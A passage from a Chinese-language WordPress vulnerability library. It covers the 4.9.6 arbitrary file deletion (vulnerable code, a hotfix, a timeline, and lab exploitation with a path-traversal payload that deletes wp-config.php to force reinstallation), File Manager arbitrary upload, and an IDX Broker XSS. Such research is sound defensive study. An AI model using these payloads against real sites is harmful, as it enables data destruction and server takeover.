uses it.\n        if (! $wpdb-&gt;get_row( $wpdb-&gt;prepare( \"SELECT meta_id FROM $wpdb-&gt;postmeta WHERE meta_key = '_wp_attachment_metadata' AND meta_value LIKE %s AND post_id &lt;&gt; %d\", '%' . $wpdb-&gt;esc_like( $meta['thumb'] ) . '%', $post_id)) ) {\n            $thumbfile = str_replace(basename($file), $meta['thumb'], $file);\n            /** This filter is documented in wp-includes/functions.php */\n            $thumbfile = apply_filters( 'wp_delete_file', $thumbfile );\n            @ unlink( path_join($uploadpath['basedir'], $thumbfile) );\n        }\n    }\n    ...\n}\n</code></pre> <p></p> <p><code>$meta['thumb']</code>\u6765\u81ea\u4e0e\u6570\u636e\u5e93\uff0c\u662f\u56fe\u7247\u7684\u5c5e\u6027\u4e4b\u4e00\u3002\u4ee3\u7801\u672a\u68c0\u67e5<code>$meta['thumb']</code>\u7684\u5185\u5bb9\uff0c\u76f4\u63a5\u5e26\u5165<code>unlink</code>\u51fd\u6570\uff0c\u5982\u679c<code>$meta['thumb']</code>\u53ef\u63a7\u5219\u53ef\u5bfc\u81f4\u6587\u4ef6\u5220\u9664\u3002</p> <p>\u6587\u4ef6/wp-admin/post.php\u4e2d\uff1a</p> <p></p> <pre><code>...\nswitch($action) {\n...\n    case 'editattachment':\n        check_admin_referer('update-post_' . $post_id);\n        ...\n        // Update the thumbnail filename\n        $newmeta = wp_get_attachment_metadata( $post_id, true );\n        $newmeta['thumb'] = $_POST['thumb'];\n\n        wp_update_attachment_metadata( $post_id, $newmeta );\n...\n</code></pre> <p></p> <p><code>$newmeta['thumb']</code>\u6765\u81ea\u4e8e$_POST['thumb']\uff0c\u672a\u7ecf\u8fc7\u6ee4\u76f4\u63a5\u5c06\u5176\u5b58\u5165\u6570\u636e\u5e93\uff0c\u5373\u4e0a\u4e00\u6b65\u7684<code>$meta['thumb']</code>\u53ef\u63a7\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_1","title":"\u4e34\u65f6\u4fee\u8865\u7a0b\u5e8f","text":"<p>\u901a\u8fc7\u5c06\u4fee\u590d\u7a0b\u5e8f\u6dfb\u52a0\u5230<code>functions.php</code>\u5f53\u524d\u6d3b\u52a8\u7684\u4e3b\u9898/\u5b50\u4e3b\u9898\u7684\u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u5c06\u4fee\u590d\u7a0b\u5e8f\u96c6\u6210\u5230\u73b0\u6709\u7684WordPress\u5b89\u88c5\u4e2d\u3002</p> <p></p> <pre><code>add_filter( 'wp_update_attachment_metadata', 'rips_unlink_tempfix' );\n\nfunction rips_unlink_tempfix( $data ) {\n    if( isset($data['thumb']) ) {\n        $data['thumb'] = basename($data['thumb']);\n    }\n\n    return $data;\n}\n</code></pre> <p></p> <p>\u6240\u63d0\u4f9b\u7684Hotfix\u6240\u505a\u7684\u5c31\u662f\u6302\u94a9<code>wp_update_attachement_metadata()</code>\u8c03\u7528\u5e76\u786e\u4fdd\u4e3a\u5143\u503c\u63d0\u4f9b\u7684\u6570\u636e<code>thumb</code>\u4e0d\u5305\u542b\u4efb\u4f55\u53ef\u4ee5\u8fdb\u884c\u8def\u5f84\u904d\u5386\u7684\u90e8\u5206\u3002\u56e0\u6b64\uff0c\u4e0d\u80fd\u5220\u9664\u4efb\u4f55\u5b89\u5168\u76f8\u5173\u6587\u4ef6\u3002</p> <p>\u63d0\u4f9b\u7684\u4fee\u590d\u7a0b\u5e8f\u6700\u7ec8\u5e94\u89c6\u4e3a\u4e34\u65f6\u4fee\u590d\uff0c\u4ee5\u9632\u6b62\u653b\u51fb\u3002\u6211\u4eec\u65e0\u6cd5\u76d1\u7763WordPress\u63d2\u4ef6\u7684\u6240\u6709\u53ef\u80fd\u7684\u5411\u540e\u517c\u5bb9\u6027\u95ee\u9898\uff0c\u5e76\u5efa\u8bae\u60a8\u8c28\u614e\u5bf9WordPress\u6587\u4ef6\u8fdb\u884c\u4efb\u4f55\u4fee\u6539\u3002</p> <p>\u62ab\u9732\u65f6\u95f4\uff1a</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#_2","title":"\u65f6\u95f4\u7ebf","text":"\u65e5\u671f \u4ec0\u4e48 2017\u5e7411\u670820\u65e5 \u5728Hackerone\u4e0a\u5411WordPress\u5b89\u5168\u56e2\u961f\u62a5\u544a\u4e86\u6f0f\u6d1e\u3002 2017\u5e7411\u670822\u65e5 \u8be5\u6f0f\u6d1e\u7531\u5b89\u5168\u56e2\u961f\u8fdb\u884c\u5206\u7c7b\u548c\u9a8c\u8bc1\u3002 2017\u5e7412\u670812\u65e5 \u8981\u6c42\u8fdb\u6b65\u3002 2017\u5e7412\u670818\u65e5 Wordpress\u6b63\u5728\u5f00\u53d1\u4e00\u4e2a\u8865\u4e01\u3002\u8981\u6c42\u53d1\u5e03\u65e5\u671f\u3002\u6ca1\u6709\u53cd\u5e94\u3002 2018\u5e741\u67089\u65e5 \u8981\u6c42\u53d1\u5e03\u65e5\u671f\u3002\u6ca1\u6709\u53cd\u5e94\u3002 2018\u5e741\u670820\u65e5 \u7531\u4e8e\u95ee\u9898\u7684\u4e25\u91cd\u6027\u548c\u7f3a\u4e4f\u6c9f\u901a\u800c\u88ab\u8981\u6c42\u5bf9Hackerone\u8fdb\u884c\u8c03\u89e3\u3002 2018\u5e741\u670824\u65e5 WordPress\u5b89\u5168\u56e2\u961f\u4f30\u8ba1\u4fee\u590d\u65f6\u95f4\u4e3a6\u4e2a\u6708\u3002 2018\u5e745\u670824\u65e5 \u88ab\u95ee\u53ca\u6709\u5173\u8be5\u95ee\u9898\u7684\u8fdb\u5c55\u548c/\u6216\u8ba1\u5212\uff0c\u5e76\u63d0\u9192\u6211\u4eec\u5c06\u5c3d\u5feb\u53d1\u5e03\u3002\u6ca1\u6709\u53cd\u5e94\u3002 2018\u5e745\u670824\u65e5 \u5c06twitter DM\u53d1\u9001\u7ed9\u5b89\u5168\u56e2\u961f\u7684\u6210\u5458\uff0c\u4ee5\u786e\u4fdd\u4ed6\u4eec\u4e0d\u4f1a\u5ffd\u7565Hackerone\u4e0a\u7684\u6d88\u606f\u3002 2018\u5e746\u670826\u65e5 \u8be5\u95ee\u9898\u5728\u62a5\u544a\u540e\u8d85\u8fc77\u4e2a\u6708\u672a\u5f97\u5230\u4fee\u8865\u3002 <p>\u8be6\u7ec6\u5206\u6790\u53ef\u89c1\uff1aWARNING: WordPress File Delete to Code Execution - </p> <p>https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#0x03","title":"0x03 \u6f0f\u6d1e\u5229\u7528","text":"<p>\u6761\u4ef6\uff1a\u9700\u8981\u767b\u9646\u540e\u53f0\uff0c\u6709\u70b9\u9e21\u52a9</p> <p></p> <p>\u540e\u53f0\u5730\u5740\uff1a</p> <p>http://10.10.10.103/wp-login.php?redirect_to=http%3A%2F%2F10.10.10.103%2Fwp-admin%2F&amp;reauth=1</p> <p></p> <p>\u8fdb\u5165\u540e\u53f0\u540e\uff0c\u70b9\u51fbMedia\uff08\u5a92\u4f53\uff09\uff0c\u5728\u70b9\u51fbAdd New (\u6dfb\u52a0)</p> <p></p> <p>\u8fdb\u5165\u5230\u4e0a\u4f20\u6587\u4ef6\u4f4d\u7f6e</p> <p></p> <p>\u4e0a\u4f20\u597d\u56fe\u7247\u4ee5\u540e\uff0c\u70b9\u51fb\u53f3\u8fb9Edit\uff08\u7f16\u8f91\u6309\u94ae\uff09</p> <p></p> <p>\u8df3\u8f6c\u5230</p> <p>http://10.10.10.103/wp-admin/post.php?post=21&amp;action=edit</p> <p></p> <p>\u6b64\u65f6\u6253\u5f00F12,\u641c\u7d22post.php,\u627e\u5230_wpnonce\u7684\u503c\u4e3ad8efee3064</p> <p></p> <p>\u7136\u540e\u53d1\u9001post\u6570\u636e\u5305 (\u9700\u8981\u5e26\u5165cookie\u503c)</p> <p>POST /wp-admin/post.php?post=21&amp;action=edit HTTP/1.1</p> <p>payload: action=editattachment&amp;_wpnonce=d8efee3064&amp;thumb=../../../../wp-config.php</p> <p></p> <p>\u53d1\u9001\u6210\u529f\u4f1a\u8fd4\u56de302\u72b6\u6001</p> <p>\u6b64\u65f6\u5728\u70b9\u51fb\u5220\u9664\u6309\u94ae Delete Permanently</p> <p>http://10.10.10.103/wp-admin/post.php?post=21&amp;action=delete&amp;_wpnonce=05621e9c6b</p> <p></p> <p>\u6293\u5305\u67e5\u770b\uff0c\u4e5f\u662f\u8fd4\u56de302\u5305</p> <p></p> <p>\u518d\u53bb\u7f51\u7ad9\u6839\u76ee\u5f55\u67e5\u770bwp-config.php </p> <p>\u53d1\u73b0wp-config.php (\u6570\u636e\u5e93\u914d\u7f6e\u6587\u4ef6\u88ab\u6210\u529f\u5220\u9664\u4e86)</p> <p></p> <p>\u518d\u6b21\u8bbf\u95ee\u9996\u9875\uff0c \u4f1a\u53d1\u73b0\u63d0\u793a\u4f60\u91cd\u65b0\u5b89\u88c5wordpress</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#-","title":"\u5f71\u54cd - \u653b\u51fb\u8005\u53ef\u4ee5\u505a\u4e9b\u4ec0\u4e48","text":"<p>\u5229\u7528\u6b64\u6f0f\u6d1e\u53ef\u4ee5\u4f7f\u653b\u51fb\u8005\u80fd\u591f\u5220\u9664WordPress\u5b89\u88c5\u7684\u4efb\u4f55\u6587\u4ef6\uff08+  PHP\u8fdb\u7a0b\u7528\u6237\u5177\u6709\u5220\u9664\u6743\u9650\u7684\u670d\u52a1\u5668\u4e0a\u7684\u4efb\u4f55\u5176\u4ed6\u6587\u4ef6\uff09\u3002\u9664\u4e86\u64e6\u9664\u6574\u4e2aWordPress\u5b89\u88c5\u7684\u53ef\u80fd\u6027\uff0c\u5982\u679c\u6ca1\u6709\u53ef\u7528\u7684\u5f53\u524d\u5907\u4efd\u53ef\u80fd\u4f1a\u4ea7\u751f\u707e\u96be\u6027\u540e\u679c\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5229\u7528\u4efb\u610f\u6587\u4ef6\u5220\u9664\u7684\u80fd\u529b\u6765\u89c4\u907f\u4e00\u4e9b\u5b89\u5168\u63aa\u65bd\u5e76\u5728Web\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002\u66f4\u786e\u5207\u5730\u8bf4\uff0c\u53ef\u4ee5\u5220\u9664\u4ee5\u4e0b\u6587\u4ef6\uff1a</p> <ul> <li>.htaccess\uff1a\u901a\u5e38\uff0c\u5220\u9664\u6b64\u6587\u4ef6\u4e0d\u4f1a\u4ea7\u751f\u4efb\u4f55\u5b89\u5168\u540e\u679c\u3002\u4f46\u662f\uff0c\u5728\u67d0\u4e9b\u60c5\u51b5\u4e0b\uff0c*.htaccess*\u6587\u4ef6\u5305\u542b\u4e0e\u5b89\u5168\u6027\u76f8\u5173\u7684\u7ea6\u675f\uff08\u4f8b\u5982\uff0c\u5bf9\u67d0\u4e9b\u6587\u4ef6\u5939\u7684\u8bbf\u95ee\u7ea6\u675f\uff09\u3002\u5220\u9664\u6b64\u6587\u4ef6\u5c06\u505c\u7528\u8fd9\u4e9b\u5b89\u5168\u7ea6\u675f\u3002</li> <li>index.php\u6587\u4ef6\uff1a\u901a\u5e38\u5c06\u7a7a\u7684*index.php*\u6587\u4ef6\u653e\u5165\u76ee\u5f55\u4e2d\uff0c\u4ee5\u9632\u6b62Web\u670d\u52a1\u5668\u65e0\u6cd5\u6267\u884c\u6b64\u64cd\u4f5c\u7684\u76ee\u5f55\u5217\u8868\u3002\u5220\u9664\u8fd9\u4e9b\u6587\u4ef6\u4f1a\u5411\u653b\u51fb\u8005\u6388\u4e88\u53d7\u6b64\u5ea6\u91cf\u4fdd\u62a4\u7684\u76ee\u5f55\u4e2d\u6240\u6709\u6587\u4ef6\u7684\u5217\u8868\u3002</li> <li>wp-config.php\uff1a\u5220\u9664WordPress\u5b89\u88c5\u7684\u8fd9\u4e2a\u6587\u4ef6\u4f1a\u5728\u4e0b\u6b21\u8bbf\u95ee\u7f51\u7ad9\u65f6\u89e6\u53d1WordPress\u5b89\u88c5\u8fc7\u7a0b\u3002\u8fd9\u662f\u56e0\u4e3a*wp-config.php*\u5305\u542b\u6570\u636e\u5e93\u51ed\u636e\uff0c\u5e76\u4e14\u6ca1\u6709\u5b83\u7684\u5b58\u5728\uff0cWordPress\u5c31\u50cf\u5c1a\u672a\u5b89\u88c5\u4e00\u6837\u3002\u653b\u51fb\u8005\u53ef\u4ee5\u5220\u9664\u6b64\u6587\u4ef6\uff0c\u4f7f\u7528\u4ed6\u4e3a\u7ba1\u7406\u5458\u5e10\u6237\u9009\u62e9\u7684\u51ed\u636e\u8fdb\u884c\u5b89\u88c5\u8fc7\u7a0b\uff0c\u6700\u540e\u5728\u670d\u52a1\u5668\u4e0a\u6267\u884c\u4efb\u610f\u4ee3\u7801\u3002</li> </ul>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%204.9.6%20%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E5%88%A0%E9%99%A4%E6%BC%8F%E6%B4%9E/#0x04","title":"0x04 \u53c2\u8003\u8d44\u6599","text":"<p>https://blog.ripstech.com/2018/wordpress-file-delete-to-code-execution/</p> <p>https://xz.aliyun.com/t/2413</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20File-manager%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0/","title":"\u7b80\u4ecb","text":"<p>WordPress\u63d2\u4ef6WPFileManager\u4e2d\u5b58\u5728\u4e00\u4e2a\u4e25\u91cd\u76840day\u5b89\u5168\u6f0f\u6d1e\uff0c\u653b\u51fb\u8005\u53ef\u4ee5\u5728\u5b89\u88c5\u4e86\u6b64\u63d2\u4ef6\u7684\u4efb\u4f55WordPress\u7f51\u7ad9\u4e0a\u4efb\u610f\u4e0a\u4f20\u6587\u4ef6\u5e76\u8fdc\u7a0b\u6267\u884c\u4ee3\u7801\u3002</p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20File-manager%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_2","title":"\u5f71\u54cd\u7248\u672c","text":"<pre><code>File Manager 6.0-6.8\n</code></pre>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20File-manager%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_3","title":"\u73af\u5883\u642d\u5efa","text":"<p>Wordpress\u4e0b\u8f7d\u5730\u5740</p> <pre><code>https://cn.wordpress.org/wordpress-5.4.1-zh_CN.tar.gz\n</code></pre> <p>\u63d2\u4ef6\u4e0b\u8f7d\u5730\u5740</p> <pre><code>http://plugins.svn.wordpress.org/wp-file-manager/tags/6.0/\n</code></pre> <p>\u767b\u5f55\u540e\u53f0\u628a\u63d2\u4ef6\u538b\u7f29\u5305\u4e0a\u4f20\u63d2\u4ef6\u5e76\u542f\u52a8</p> <p></p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20File-manager%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_4","title":"\u6f0f\u6d1e\u590d\u73b0","text":"<p>\u8bbf\u95eehttp://192.168.56.1/wordpress/wp-content/plugins/wp-file-manager/lib/php/connector.minimal.php\u9875\u9762\u53ef\u4ee5\u53d1\u73b0errUnknownCmd</p> <p>\u7591\u4f3c\u6f0f\u6d1e</p> <p></p> <p>Poc\u5730\u5740\uff1ahttps://github.com/xDro1d/wp-file-manager</p> <p>\u53ef\u4ee5\u53d1\u73b0\u547d\u4ee4\u6210\u529f\u6267\u884c</p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20File-manager%E4%BB%BB%E6%84%8F%E2%BD%82%E4%BB%B6%E4%B8%8A%E4%BC%A0/#_5","title":"\u6f0f\u6d1e\u5206\u6790","text":"<p>\u76f4\u63a5\u4eceelFinderConnector\u6784\u9020\u65b9\u6cd5\u540e\u7684run\u5f00\u59cb</p> <p></p> <p>\u7136\u540e\\wordpress\\wp-content\\plugins\\wp-file-manager\\lib\\php\\elFinderConnector.class.php\u6587\u672c\u4e2d</p> <p>\u521d\u59cb\u5316</p> <p></p> <p>\u7136\u540erun</p> <p></p> <p>\u9996\u5148\u5224\u65ad\u662f\u5426\u662fPOST\u65b9\u6cd5\u4f20\u5165\u6570\u636e\uff0c\u63a5\u7740\u5408\u5e76\u6570\u7ec4\u81f3$src</p> <p>\\(maxInuptVars = null\uff0c\u800c\\)src\u662f\u5b58\u5728\u7684</p> <p></p> <p>\u6b64\u65f6$_REQUEST\u4e2d\uff0ccmd\u4e3aupload\uff0ctarget\u4e3al1_Lw==</p> <p></p> <p>\u6ca1\u6709targets\u53c2\u6570,\u7b2c\u4e00\u4e2aif\u8bed\u53e5\u4e0d\u6267\u884c</p> <p>\u7b2c\u4e8c\u4e2aif\u8bed\u53e5\u5224\u65adjson_encode\u65b9\u6cd5\u662f\u5426\u53ef\u7528\uff0c\u540e\u9762\u770bflFinder-&gt;loaded\u65b9\u6cd5\uff0c\u8fd9\u91cc\u8fd4\u56detrue\uff0c\u8df3\u8fc7</p> <p></p> <p>Cmd\u5b58\u5728\u503c\uff0c\u8df3\u8fc7</p> <p></p> <p>\u6b64\u5904\u7684$cmd\u4e3aupload</p> <p></p> <p></p> <p>\u6765\u5230foreach\u8bed\u53e5</p> <p>commandArgsList\u65b9\u6cd5\u8ddf\u8fdb</p> <p></p> <p>\u6574\u7406\u5f97</p> <pre><code>'upload' =&gt; array('target' =&gt; true, 'FILES' =&gt; true, 'mimes' =&gt; false, 'html' =&gt; false, 'upload' =&gt; false, 'name' =&gt; false, 'upload_path' =&gt; false, 'chunk' =&gt; false, 'cid' =&gt; false, 'node' =&gt; false, 'renames' =&gt; false, 'hashes' =&gt; false, 'suffix' =&gt; false, 'mtime' =&gt; false, 'overwrite' =&gt; false, 'contentSaveId' =&gt; false\n</code></pre> <p>\\(list\u7b2c\u4e00\u952e\u503c\u4e0d\u662fFILES\uff0c\u6240\u4ee5\u8df3\u8fc7\u7b2c\u4e00\u4e2aif\u8bed\u53e5\uff0c\u800c\u7b2c\u4e00\u4e2atarget\u53c8\u5b58\u5728\u4e8e\\)src\u6570\u7ec4\u4e2d</p> <p></p> <p>\u5c06target\u7684\u503c\u7ed9\u4e86$arg\uff0c\u518d\u7528trim\u51fd\u6570\u6e05\u7a7a\u767d\u5b57\u7b26</p> <p></p> <p>$args\u4e2ddebug\u662f\u5b58\u5728\u7684\uff0c\u6240\u4ee5debug\u7684\u503c\u88ab\u8bbe\u7f6e\u4e3afalse</p> <p></p> <p>\u63a5\u7740\u5c31\u662felFinderConnector\u7684input_filter\u65b9\u6cd5</p> <p></p> <p>\u56e0\u4e3a\u8fd9\u91cc\u7684php\u7248\u672c\u5927\u4e8e5.4\u6240\u4ee5\\(magic_quotes_gpc\u7684\u503c\u4e3afalse\uff0c\\)args\u662f\u6570\u7ec4\uff0c\u7136\u540e\u90fd\u8fdb\u884c\u8fc7\u6ee4\u4e00\u904d</p> <p></p> <p>\u518d\u4e4b\u540e\u5bf9\u5c06\u4e0a\u4f20\u6587\u4ef6\u7684\u4fe1\u606f\u7ed9\u4e86$args\u6570\u7ec4\u4e2d\u7684FILES\u5143\u7d20\uff0c\u63a5\u7740\u6267\u884celFinder\u5bf9\u8c61\u7684exec\u51fd\u6570</p> <p></p> <p>\u518d\u4e4b\u540e\u5bf9\u5c06\u4e0a\u4f20\u6587\u4ef6\u7684\u4fe1\u606f\u7ed9\u4e86$args\u6570\u7ec4\u4e2d\u7684FILES\u5143\u7d20\uff0c\u63a5\u7740\u6267\u884celFinder\u5bf9\u8c61\u7684exec\u51fd\u6570</p> <p></p> <p>\u5728exec\u51fd\u6570\u4e2d\u5224\u65ad\u5b8csession\u4ee5\u53ca\u662f\u5426\u53ef\u4ee5\u8fdb\u884c\u4e0a\u4f20\u64cd\u4f5c\u4e4b\u540e\u7ee7\u7eed\u5224\u65ad</p> <p></p> <p>\u5c06l1_Lw== \u4f5c\u4e3a\u53c2\u6570\u4f20\u9012\u7ed9volume\u51fd\u6570</p> <p></p> <p>\u6b64\u65f6volumes\u4e2d\u6709\u4e24\u4e2a\u952e\uff0c\u5230\u6b64\u5904\u53ef\u4ee5\u53d1\u73b0POC\u4e2d\u4e0a\u4f20\u6587\u4ef6\u7684target\u5143\u7d20\u7684\u503c\u53ea\u80fd\u4ee5l1\u6216\u8005t1\u5f00\u5934</p> <p>\u8fd9\u91cc\u4f20\u5165\u7684$hash\u4e3al1_Lw==</p> <p>$result\u4e3a\u7a7a</p> <p></p> <p>$args['sessionCloseEarlier']\u88ab\u8bbe\u7f6e\u4e3atrue\u7b49\u7b49</p> <p></p> <p></p> <p>\u8ddf\u8fdb$cmd\u8fdb\u5165\u5230upload\u65b9\u6cd5</p> <p></p> <p>\u63a5\u7740\u83b7\u53d6\u5230\u6587\u4ef6\u7684\u4e34\u65f6\u6587\u4ef6\u540d\uff0c\\(paths\u83b7\u53d6\u5230\u6587\u4ef6\u8def\u5f84\u4e3a\\)target\u7684\u503c</p> <p>\u63a5\u7740\\(files\uff0c\\)header\u7b49\u4e00\u7cfb\u5217\u53d8\u91cf\u5bf9\u6587\u4ef6\u4e0a\u4f20\u7684\u8bbe\u7f6e\u8fdb\u884c\u521d\u59cb\u5316\u6216\u8005\u5f97\u5230\u4e0a\u4f20\u6587\u4ef6\u7684\u5177\u4f53\u4fe1\u606f</p> <p></p> <p>post\u63d0\u4ea4cmd\u7684\u503c\uff0c\u8c03\u7528upload\u65b9\u6cd5\uff0cupload\u65b9\u6cd5\u4ece\u4e0a\u4f20\u6587\u4ef6\u4e2d\u63d0\u53d6\u4fe1\u606f</p> <p></p> <p>$files\u7684error\u4e3a0\uff0c\u4f7f\u7528\u7b2c\u4e00\u4e2aif\u8bed\u53e5\u76f4\u63a5\u5ffd\u7565</p> <p></p> <p>\u63a5\u7740\u770bchangeDst\u88ab\u8bbe\u7f6e\u4e3afalse\uff0c\u56e0\u4e3a\u7b2c\u4e00\u4e2aif\u5faa\u73af\u4e2d\u7684\u503c\u90fd\u5b58\u5728\uff0c\u6240\u4ee5\u5c06$changeDst\u8bbe\u7f6e\u4e3atrue\uff0c\u4e4b\u540e\u8fdb\u5165foreach\u5faa\u73af</p> <p>'</p> <p>\u6b64\u65f6\u7684\\(_target\u5df2\u7ecf\u6709\\)target\u7684\u503c\u4e86</p> <p></p> <p>\u7ee7\u7eed\u8ddf\u8fdb</p> <p></p> <p>\u6765\u5230commandDisabled\u51fd\u6570\u5224\u65ad\u662f\u5426\u5141\u8bb8\u4e0a\u4f20\u529f\u80fd</p> <p></p> <p>\u6709\u4e0a\u4f20\u529f\u80fd\uff0c\u7ee7\u7eed\u8c03\u7528dir\u65b9\u6cd5\uff0c\u5c06$hash(target)\u7684\u503c\u4f20\u5165\uff0c\u518d\u8ddf\u8fdbfile\u65b9\u6cd5</p> <p></p> <p>file\u51fd\u6570\u4e2d\u6709\u4e00\u4e2adecode\u65b9\u6cd5\uff0c\u8ddf\u8fdb</p> <p></p> <p>\u8fd9\u91cc\u628a\u6211\u4eec\u7684l1_Lw==\u8fdb\u884c\u4e86\u89e3\u7801\uff0cdecode\u51fd\u6570\u9996\u5148\u5224\u65ad$hash\u662f\u4ee5l1_\u5f00\u5934\uff0c\u8fd8\u662f\u4ee5t1_\u5f00\u5934\uff0c\u63a5\u7740\u5bf9l1_\u4e4b\u540e\u7684\u90e8\u5206\u8fdb\u884cbase64\u89e3\u7801</p> <p></p> <p>\u7d27\u63a5\u7740\u8fd4\u56de\u6211\u4eec\u7684file\u65b9\u6cd5</p> <p>file\u65b9\u6cd5\u53c8\u8fd4\u56de\u7ed9dir\u65b9\u6cd5</p> <p></p> <p></p> <p>\u8ddf\u8fdb\u5230mimetype\u83b7\u53d6\u4e0a\u4f20\u6587\u4ef6\u7684\u4e0a\u4f20\u7c7b\u578b</p> <p></p> <p></p>"},{"location":"%E6%BC%8F%E6%B4%9E%E5%BA%93/01-CMS%E6%BC%8F%E6%B4%9E/Wordpress/Wordpress%20IMPress%20for%20IDX%20Broker%20%E4%BD%8E%E6%9D%83%E9%99%90xss%E6%BC%8F%E6%B4%9E/","title":"Wordpress IMPress for IDX Broker \u4f4e\u6743\u9650xss\u6f0f\u6d1e","text":"<p>\u200b   CVE-2020-11512\u5206\u6790</p> <p>\u200b    \u9996\u5148\u770b\u5230\u5728\u63d2\u4ef6\u7684\u76ee\u5f55plugins\\idx-broker-platinum\\idx\\initiate-plugin.php\u6587\u4ef6\u4e0b\u7684277\u884c\u7684idx_update_recaptcha_key\u51fd\u6570\u4e2d\u63a5\u6536\u4e86POST\u53c2\u6570idx_recaptcha_site_key\u6570\u636e\uff0c\u5728279\u884c\u88abupdate_option\u51fd\u6570\u8c03\u7528</p> <p>\u200b   \u6ce8\uff1a\u5728\u5f53\u524d\u8d26\u6237\u6743\u9650\u4e0b\uff0c\u6267\u884c\u4fee\u6539\u521d\u59cb\u5316\u4fe1\u606f\u53ea\u53ef\u4ee5\u7528\u8fd9\u4e2a\u9a8c\u8bc1\uff0c\u8fd4\u56de\u4fe1\u606f\u53ea\u6709\u4e00\u4e2a1\uff0c\u5982\u679c\u4e0d\u662f1\u8bf4\u660e\u4fee\u6539\u5931\u8d25 \u5728\u5728\u5f53\u524d\u7528\u6237\u5168\u4e0b\u8f7d\u901a\u8fc7Wordpress IMPress for IDX Broker\u53ef\u4ee5\u8d8a\u6743\u64cd\u4f5cIMPress for IDX  Brokerc\u63d2\u4ef6\u7684\u521d\u59cb\u5316\u4fe1\u606f\uff0c\u901a\u8fc7xss\u6f0f\u6d1e\u83b7\u53d6\u7ba1\u7406\u5458\u654f\u611f\u4fe1\u606f\u3002</p> <p>\u200b   </p> <p>\u200b   \u4e0b\u9762\u6211\u4eec\u770b\u4e0bupdate_option\u51fd\u6570\u5bf9\u8be5\u6570\u636e\u7684\u64cd\u4f5c\uff0c\u8be5\u51fd\u6570\u662f\u5bf9wordpress\u4e2d\u7684options\u53c2\u6570\u7684\u8fdb\u884c\u66f4\u65b0\u6570\u636e\uff0c\u6211\u4eec\u770b\u5230\u4e0a\u9762\u5bf9options\u7684\u4f20\u5165\u53c2\u6570\u4e3aidx_recaptcha_site_key\uff0c\u5373\u66f4\u65b0\u8be5\u53c2\u6570\u7684\u503c  </p> <p>\u200b   \u5728390\u884c\u6211\u4eec\u770b\u5230\u6267\u884c\u4e86update\u53c2\u6570\uff0c\u66f4\u65b0\u4e86\u6570\u636e\u5e93\u4e2d\u7684\u6570\u636e     \u6211\u4eec\u5728update_option\u51fd\u6570\u4e2d\u8c03\u7528\u4e86wp_protect_special_option\u5bf9option\u53c2\u6570\u540d\u8fdb\u884chtml\u8fc7\u6ee4\uff0c\u5374\u6ca1\u6709\u5bf9value\u8fdb\u884c\u8fc7\u6ee4\uff0c\u5f15\u53d1\u4e86xss\u6f0f\u6d1e  </p> <p>\u200b   \u4e0b\u9762\u6211\u4eec\u770b\u4e0b\u51fd\u6570idx_update_recaptcha_key\u7684\u8c03\u7528\u4f4d\u7f6e\uff0c\u5728initiate-plugin.php\u6587\u4ef6\u4e0b\u768434\u884chook\u5728wp_ajax_idx_update_recaptcha_key tag\u4e0a\uff0c</p> <p>\u200b      \u6211\u5011\u5728admin-ajax.php\u9875\u9762\u4e2d159\u884c\u4e2d\u83b7\u53d6\u5230action\u53c2\u6570\uff0c\u4f7f\u7528is_user_logged_in\u5224\u65ad\u4e86\u7528\u6237\u6743\u9650\u540e\uff0c\u76f4\u63a5\u5c06action\u53c2\u6570\u62fc\u63a5\u5230do_action\u51fd\u6570\u4e2d\u8fdb\u884c\u6267\u884c\uff0c\u800cis_user_logged_in\u53ea\u662f\u5224\u65ad\u7528\u6237\u662f\u5426\u5b58\u5728\uff0c\u6ca1\u6709\u8fdb\u884c\u6743\u9650\u5224\u65ad\u3002</p> <p>\u200b   